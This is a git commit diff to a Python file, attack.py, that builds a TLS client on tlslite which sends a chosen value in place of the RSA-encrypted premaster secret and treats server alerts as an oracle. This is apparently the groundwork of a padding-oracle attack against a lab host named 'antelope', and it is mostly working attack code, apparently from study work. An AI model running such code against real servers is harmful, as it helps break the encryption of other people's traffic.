99f267ed1ae81b3c10e9ed137a1fdf6dffca838b
djwj <daniel@wilshirejones.com>
2019-10-25 21:25:12 +0100

    client sends the right messages

--- attack.py
+++ attack.py
@@ -1,6 +1,23 @@
+import gc
 import socket
 import tlslite
-import http_client
+
+
+from tlslite.handshakesettings import HandshakeSettings
+
+
+class RSAKeyExchangeAttack(tlslite.keyexchange.RSAKeyExchange):
+    def __init__(self, cipherSuite, clientHello, serverHello, privateKey, g):
+        super(RSAKeyExchangeAttack, self).__init__(
+            cipherSuite, clientHello, serverHello, privateKey
+        )
+        self.g = g
+
+    def processServerKeyExchange(self, srvPublicKey, serverKeyExchange):
+        """Generate premaster secret for server"""
+        g_bytes = self.g.to_bytes(length=128, byteorder="big")
+        self.encPremasterSecret = g_bytes
+        return g_bytes
 
 
 class AttackTLSConnection(tlslite.TLSConnection):
@@ -13,102 +30,81 @@ class AttackTLSConnection(tlslite.TLSConnection):
     this value to the caller of performHandshakeAttack().
     """
 
-    def performHandshakeAttack(
-        self,
-        session=None,
-        settings=None,
-        checker=None,
-        nextProtos=None,
-        reqTack=True,
-        serverName=None,
-        async_=False,
-        alpn=None,
-    ):
+    def performHandshakeAttack(self, g):
+        # This function starts a handshake with its server, sending
+        # the <g> instead of the random number in the
+        # ClientKeyExchange message.
+
+        # Setup connection object as a client about to start a handshake:
         self._handshakeStart(client=True)
 
-        if reqTack:
-            if not tackpyLoaded:
-                reqTack = False
-            if not settings or not settings.useExperimentalTackExtension:
-                reqTack = False
+        settings = HandshakeSettings()
+        settings = settings.validate()
 
-        if nextProtos is not None:
-            if len(nextProtos) == 0:
-                raise ValueError("Caller passed no nextProtos")
+        self.version = settings.maxVersion
 
-        if alpn is not None and not alpn:
-            raise ValueError("Caller passed empty alpn list")
+        # TLS handshake/dance:
+        # -> ClientHello
 
-        # Reject invalid hostnames but accept empty/None ones
-        if serverName and not is_valid_hostname(serverName):
-            raise ValueError(
-                "Caller provided invalid server host name: {0}".format(serverName)
-            )
+        # Defaults from TLSConnection._handshakeClientAsync()
+        srpUsername = None
+        reqTack = True
+        nextProtos = None
+        serverName = None
+        extensions = None
 
-        # Validates the settings and filters out any unsupported ciphers
-        # or crypto libraries that were requested
-        if not settings:
-            settings = HandshakeSettings()
-            settings = settings.validate()
-            self.sock.padding_cb = settings.padding_cb
+        # getCertSuites() returns the "plain" RSA cipher suits.
+        cipherSuites = tlslite.constants.CipherSuite.getCertSuites(settings)
+        certificateTypes = settings.getCertificateTypes()
 
-        if session:
-            # session.valid() ensures session is resumable and has
-            # non-empty sessionID
-            if not session.valid():
-                session = None  # ignore non-resumable sessions...
-            elif session.resumable:
-                if session.srpUsername != srpUsername:
-                    raise ValueError("Session username doesn't match")
-                if session.serverName != serverName:
-                    raise ValueError("Session servername doesn't match")
-
-        # Tentatively set the client's record version.
-        # We'll use this for the ClientHello, and if an error occurs
-        # parsing the Server Hello, we'll use this version for the response
-        # in TLS 1.3 it always needs to be set to TLS 1.0
-        self.version = (3, 1) if settings.maxVersion > (3, 3) else settings.maxVersion
-
-        # OK Start sending messages!
-        # *****************************
-
-        # Send the ClientHello.
-        for result in self._clientSendClientHello(
-            settings,
-            session,
+        # Construct message, then send
+        clientHello = tlslite.messages.ClientHello()
+        clientHello.create(
+            settings.maxVersion,
+            tlslite.utils.cryptomath.getRandomBytes(32),
+            bytearray(0),
+            cipherSuites,
+            certificateTypes,
             srpUsername,
-            srpParams,
-            certParams,
-            anonParams,
-            serverName,
-            nextProtos,
             reqTack,
-            alpn,
+            nextProtos is not None,
+            serverName,
+            extensions=extensions,
+        )
+
+        for _ in self._sendMsg(clientHello):
+            pass
+
+        # <- ServerHello
+        # <- Certificate
+        # <- ServerHelloDone
+        for serverHello in self._getMsg(
+            tlslite.constants.ContentType.handshake,
+            tlslite.constants.HandshakeType.server_hello,
         ):
-            clientHello = result
+            pass
 
-        # Get the ServerHello.
-        for result in self._clientGetServerHello(settings, session, clientHello):
-            serverHello = result
-            cipherSuite = serverHello.cipher_suite
+        self.version = serverHello.server_version
 
-        # Choose a matching Next Protocol from server list against ours
-        # (string or None)
-        nextProto = self._clientSelectNextProto(nextProtos, serverHello)
+        if serverHello.cipher_suite not in cipherSuites:
+            raise Exception("Server responded with incorrect ciphersuite")
+        cipherSuite = serverHello.cipher_suite
 
-        # Check if server selected encrypt-then-MAC
-        if serverHello.getExtension(ExtensionType.encrypt_then_mac):
-            self._recordLayer.encryptThenMAC = True
+        if serverHello.certificate_type not in clientHello.certificate_types:
+            raise Exception("Server responded with incorrect certificate type")
 
-        if serverHello.getExtension(ExtensionType.extended_master_secret):
-            self.extendedMasterSecret = True
+        # -> ClientKeyExchange
+        # Start the process as normal...
+        clientCertChain = None
+        privateKey = None
 
-        # Don't bother with other types of key exchange, this attack is on RSA.
-        keyExchange = RSAKeyExchange(cipherSuite, clientHello, serverHello, None)
+        # <naughty code>
+        keyExchange = RSAKeyExchangeAttack(
+            cipherSuite, clientHello, serverHello, None, g
+        )
+        # </naughty code>
 
-        # We'll send a few messages here, send them in single TCP packet
-        # Umm ... no not this time
-        self.sock.buffer_writes = True
+        # Continue the process as normal...
         for result in self._clientKeyExchange(
             settings,
             cipherSuite,
@@ -120,19 +116,39 @@ class AttackTLSConnection(tlslite.TLSConnection):
             serverHello.random,
             keyExchange,
         ):
-            if result in (0, 1):
-                yield result
-            else:
-                break
-            (premasterSecret, serverCertChain, clientCertChain, tackExt) = result
+            print(repr(result))
+
+        premasterSecret, serverCertChain, clientCertChain, tackExt = result
+
+        try:
+            for result in self._clientFinished(
+                premasterSecret,
+                clientHello.random,
+                serverHello.random,
+                cipherSuite,
+                settings.cipherImplementations,
+                None,
+            ):
+                print(repr(result))
+            masterSecret = result
+
+            return False
+
+        except tlslite.errors.TLSRemoteAlert:
+            return True
 
 
 if __name__ == "__main__":
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(("antelope", 443))
+    gc.disable()
 
-    connection = AttackTLSConnection(sock)
-    connection.handshakeClientCert()
+    for index in range(10):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect(("antelope", 443))
 
-    req = http_client.make_http_request("GET", "antelope")
-    connection.write(req)
+        connection = AttackTLSConnection(sock)
+        connection.performHandshakeAttack(100 * index)
+
+        connection.close()
+        sock.close()
+
+        gc.collect()
